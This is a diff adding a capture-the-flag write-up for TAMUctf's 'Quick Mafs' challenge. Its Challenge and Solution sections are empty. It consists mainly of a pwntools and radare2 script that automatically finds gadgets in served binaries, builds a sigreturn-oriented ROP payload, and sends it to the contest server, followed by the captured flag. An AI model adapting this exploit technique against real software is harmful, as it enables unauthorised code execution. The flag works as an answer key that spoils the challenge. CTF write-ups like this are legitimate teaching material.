@@ -1,0 +1,77 @@
+# Quick Mafs
+
+## Challenge
+
+## Solution
+
+## Exploit
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+import r2pipe
+
+p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")
+
+for binary in range(5):
+    instructions = p.recvline() # the server will give you instructions as to what your exploit should do
+    p.info("INSTRUCTIONS: " + instructions.decode())
+    instructions = instructions.split()
+    targetrax = int(instructions[-1], 0)
+
+    with open("elf", "wb") as file:
+        file.write(bytes.fromhex(p.recvline().rstrip().decode()))
+
+    exe = context.binary = ELF('elf')
+
+    r = r2pipe.open(exe.path)
+    r.cmd('aaa')
+    syscall = r.cmdj('pdfj @ sym.vuln')['ops'][-4]['offset']
+
+    gadgets = r.cmdj('pdj 480 @ sym.gadgets + 0xc')
+    gadgets = [gadgets[i:i+3] for i in range(0, len(gadgets), 3)]
+
+    # print(gadgets)
+
+    constants_raw = r.cmdj('p8j 320 @ obj.constants')
+    constants = [constants_raw[i] + constants_raw[i+1] * 0x100 for i in range(0, len(constants_raw), 2)]
+
+    # print(constants)
+
+    for i in range(len(gadgets)):
+        if gadgets[i][1]['opcode'] == "sub ax, word [rbx]" and constants[i] < 0xe00 and constants[i] >= 0x110:
+            constant = constants[i]
+            gadget = gadgets[i]
+            break
+
+    length = constant + 15
+
+    # print(gadget)
+
+    p.info("CONSTANT: " + hex(constant))
+    p.info("LENGTH: " + hex(length))
+
+    frame = SigreturnFrame()
+    frame.rax = targetrax
+    frame.rip = exe.sym['print']
+    frame.rsp = exe.address + 0x4600
+
+    payload = flat({
+        0x8: [
+            gadget[0]['offset'],
+            syscall,
+            frame,
+            ],
+        }, length=length)
+
+    p.sendline(payload.hex().encode())
+
+p.interactive()
+```
+
+## Flag
+
+```
+gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}
+```
